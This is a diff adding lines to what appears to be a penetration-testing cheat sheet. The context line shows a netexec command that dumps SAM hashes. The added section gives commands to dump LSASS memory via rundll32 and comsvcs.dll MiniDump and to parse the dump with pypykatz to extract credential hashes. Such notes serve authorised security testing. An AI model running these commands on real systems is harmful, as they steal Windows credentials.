@@ -114,6 +114,12 @@ Dumping LSA/SAM remotely:
 > netexec smb aaa.bbb.cc.ddd --local-auth -u USR -p PWD --sam
 ```
 
+Extracting hash from LSASS memory
+ 
+ - Dump memory from tasklist
+ - `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PId> C:\lsass.dmp full`
+ - `pypykatz lsa minidump lsass.dmp`
+
 ## File
 
 ### File System
